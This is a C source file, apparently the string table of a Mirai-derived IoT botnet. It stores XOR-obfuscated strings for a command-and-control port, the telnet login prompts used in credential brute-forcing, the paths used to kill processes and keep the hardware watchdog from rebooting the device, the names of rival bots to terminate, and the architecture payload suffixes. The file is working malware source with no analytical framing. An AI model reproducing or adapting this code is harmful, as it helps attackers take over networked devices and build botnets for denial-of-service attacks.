#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xf3e25d74;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x22\xF3", 2); // 6859
    add_entry(TABLE_SCAN_CB_PORT, "\x1D\x39", 2); // 9473

    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x59\x55\x57\x4B\x18\x59\x18\x54\x59\x18\x48\x54\x59\x41\x59\x38", 17);// vamos a la playa

    add_entry(TABLE_SCAN_SHELL, "\x4B\x50\x5D\x54\x54\x38", 6);// shell
    add_entry(TABLE_SCAN_ENABLE, "\x5D\x56\x59\x5A\x54\x5D\x38", 7);// enable
    add_entry(TABLE_SCAN_SYSTEM, "\x4B\x41\x4B\x4C\x5D\x55\x38", 7);// system
    add_entry(TABLE_SCAN_SH, "\x4B\x50\x38", 3);// sh
    add_entry(TABLE_SCAN_QUERY, "\x17\x5A\x51\x56\x17\x5A\x4D\x4B\x41\x5A\x57\x40\x18\x6A\x71\x7E\x6C\x38", 18);// /bin/busybox DEMONS
    add_entry(TABLE_SCAN_RESP, "\x6A\x71\x7E\x6C\x02\x18\x59\x48\x48\x54\x5D\x4C\x18\x56\x57\x4C\x18\x5E\x57\x4D\x56\x5C\x38", 23);// DEMONS: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x56\x5B\x57\x4A\x4A\x5D\x5B\x4C\x38", 9);// ncorrect
    add_entry(TABLE_SCAN_PS, "\x17\x5A\x51\x56\x17\x5A\x4D\x4B\x41\x5A\x57\x40\x18\x48\x4B\x38", 16);// /bin/busybox ps
	add_entry(TABLE_SCAN_ASSWORD, "\x59\x4B\x4B\x4F\x57\x4A\x5C\x38", 8);// assword
	add_entry(TABLE_SCAN_OGIN, "\x57\x5F\x51\x56\x38", 5);// ogin
	add_entry(TABLE_SCAN_ENTER, "\x5D\x56\x4C\x5D\x4A\x38", 6);// enter

    add_entry(TABLE_KILLER_PROC, "\x17\x48\x4A\x57\x5B\x17\x38", 7);// /proc/
    add_entry(TABLE_KILLER_EXE, "\x17\x5D\x40\x5D\x38", 5);// /exe
    add_entry(TABLE_KILLER_FD, "\x17\x5E\x5C\x38", 4);// /fd
    add_entry(TABLE_KILLER_MAPS, "\x17\x55\x59\x48\x4B\x38", 6);// /maps
    add_entry(TABLE_KILLER_TCP, "\x17\x48\x4A\x57\x5B\x17\x56\x5D\x4C\x17\x4C\x5B\x48\x38", 14);// /proc/net/tcp

    add_entry(TABLE_ATK_VSE, "\x6C\x6B\x57\x4D\x4A\x5B\x5D\x18\x7D\x56\x5F\x51\x56\x5D\x18\x69\x4D\x5D\x4A\x41\x38", 21);// TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x17\x5D\x4C\x5B\x17\x4A\x5D\x4B\x57\x54\x4E\x16\x5B\x57\x56\x5E\x38", 17);// /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x56\x59\x55\x5D\x4B\x5D\x4A\x4E\x5D\x4A\x18\x38", 12);// nameserver
    
    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x17\x5C\x5D\x4E\x17\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 14);// /dev/watchdog
	add_entry(TABLE_IOCTL_KEEPALIVE2, "\x17\x5C\x5D\x4E\x17\x55\x51\x4B\x5B\x17\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 19);// /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x17\x5C\x5D\x4E\x17\x7E\x6C\x6F\x7C\x6C\x09\x08\x09\x67\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 23);// /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x17\x5C\x5D\x4E\x17\x7E\x6C\x6F\x7C\x6C\x09\x08\x09\x18\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 23);// /dev/FTWDT101\ watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE5, "\x17\x5C\x5D\x4E\x17\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x08\x38", 15);// /dev/watchdog0
    add_entry(TABLE_IOCTL_KEEPALIVE6, "\x17\x5D\x4C\x5B\x17\x5C\x5D\x5E\x59\x4D\x54\x4C\x17\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 22);// /etc/default/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE7, "\x17\x4B\x5A\x51\x56\x17\x4F\x59\x4C\x5B\x50\x5C\x57\x5F\x38", 15);// /sbin/watchdog
    
    add_entry(TABLE_EXEC_MIRAI, "\x5C\x4E\x4A\x70\x5D\x54\x48\x5D\x4A\x38", 10); // "dvrHelper"
    add_entry(TABLE_EXEC_OWARI, "\x60\x09\x01\x71\x0A\x0B\x01\x09\x0A\x0C\x6D\x71\x6D\x38", 14); // "X19I239124UIU"
    add_entry(TABLE_EXEC_JOSHO, "\x09\x0C\x7E\x59\x38", 5); // "14Fa"
	add_entry(TABLE_EXEC_ALLQBOT, "\x1D\x4B\x18\x1D\x4B\x18\x70\x6C\x6C\x68\x38", 11); // "%s %s HTTP"
	add_entry(TABLE_EXEC_OGOWARI, "\x71\x4D\x61\x5F\x4D\x52\x5D\x71\x49\x56\x38", 11); // "IuYgujeIqn"
    add_entry(TABLE_EXEC_MIRAIDLR, "\x5C\x54\x4A\x16\x38", 5);// "dlr."
    add_entry(TABLE_EXEC_MIRAIARM, "\x16\x59\x4A\x55\x38", 5);// ".arm"
    add_entry(TABLE_EXEC_MIRAIMIPS, "\x16\x55\x51\x48\x4B\x38", 6);// ".mips"
    add_entry(TABLE_EXEC_MIRAIMPSL, "\x16\x55\x48\x4B\x54\x38", 6);// ".mpsl"
    add_entry(TABLE_EXEC_X86_64, "\x16\x40\x00\x0E\x67\x0E\x0C\x38", 8);// ".x86_64"

    add_entry(TABLE_RANDOM, "\x42\x7E\x7E\x6B\x01\x41\x5A\x56\x08\x7B\x5B\x55\x59\x0E\x56\x7B\x75\x01\x0A\x6F\x50\x74\x62\x71\x4F\x5F\x79\x55\x62\x4C\x70\x00\x49\x6F\x42\x09\x4E\x4E\x6C\x7F\x72\x70\x72\x4C\x60\x71\x01\x4A\x75\x01\x55\x08\x00\x68\x38", 55);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

